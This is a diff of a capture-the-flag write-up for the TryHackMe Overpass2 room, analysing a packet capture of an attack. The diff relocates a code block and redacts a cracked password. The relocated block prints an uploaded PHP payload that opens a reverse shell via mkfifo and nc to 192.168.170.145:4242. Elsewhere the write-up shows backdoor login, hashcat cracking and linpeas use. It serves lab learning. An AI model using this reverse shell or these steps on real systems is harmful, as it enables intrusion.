@@ -31,40 +31,39 @@
     - View the data of packet number 14 (POST request made to /development/upload.php)
     - Inorder to copy the data, use **xxd** over the **hexdump** of data:
 
-    ```bash
-   $ nano hex-payload
-   $ cat hex-payload | xxd -p -r
-
-    )n
-    )�E�
-    '�������������vP��r�:
-    ��+5P,�POST /development/upload.php HTTP/1.1
-    Host: 192.168.170.159
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-    Accept-Language: en-US,en;q=0.5
-    Accept-Encoding: gzip, deflate
-    Referer: http://192.168.170.159/development/
-    Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
-    Content-Length: 454
-    Connection: keep-alive
-    Upgrade-Insecure-Requests: 1
-
-    -----------------------------1809049028579987031515260006
-    Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
-    Content-Type: application/x-php
-
-    <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
-
-    -----------------------------1809049028579987031515260006
-    Content-Disposition: form-data; name="submit"
-
-    Upload File
-    -----------------------------1809049028579987031515260006--
-    ```
-    
 ![Overpass2 - Payload](Images/overpass2-payload.png)
 
+```bash
+$ nano hex-payload
+$ cat hex-payload | xxd -p -r
+
+)n
+)�E�
+'�������������vP��r�:
+��+5P,�POST /development/upload.php HTTP/1.1
+Host: 192.168.170.159
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.170.159/development/
+Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
+Content-Length: 454
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1809049028579987031515260006
+Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
+Content-Type: application/x-php
+
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+
+-----------------------------1809049028579987031515260006
+Content-Disposition: form-data; name="submit"
+
+Upload File
+-----------------------------1809049028579987031515260006--
+```
 
 ### Follow TCP Stream
 
@@ -377,14 +376,14 @@ func passwordHandler(_ ssh.Context, password string) bool {
 ```
 
 ### What was the hash that the attacker used? - go back to the PCAP for this!
-- **In PCAP file:**
+- In **PCAP file**, we have the hash:
 
 ```bash
 james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
 ```
 
 ### Crack the hash using rockyou and a cracking tool of your choice. What's the password?
-- **Answer:** november16
+- **Answer:** REDACTED
 - **Steps to Reproduce:** 
     - Identify the hash type using `haiti`.
     - Crack the **hash:salt** using `hashcat`.
@@ -443,7 +442,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
+6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:REDACTED
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -506,7 +505,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 967.49 seconds
 ```
 
-- Using `james:november16`, we can login into the backdoor:
+- Using `james` and the hash we recently cracked as the password, we can login into the backdoor:
 - **Note:** `-p` argument must be used to specify the port!
 
 ```bash
@@ -577,6 +576,9 @@ james@overpass-production:/dev/shm$ ls
 linpeas.sh
 james@overpass-production:/dev/shm$ chmod +x linpeas.sh 
 james@overpass-production:/dev/shm$ ./linpeas.sh | tee linpeas.out
+.
+.
+.
 ```
 
 - Opps, I missed the hint in tryhackme. Going back to `/home/james`,  I was able to find hidden executable **.suid_bash**
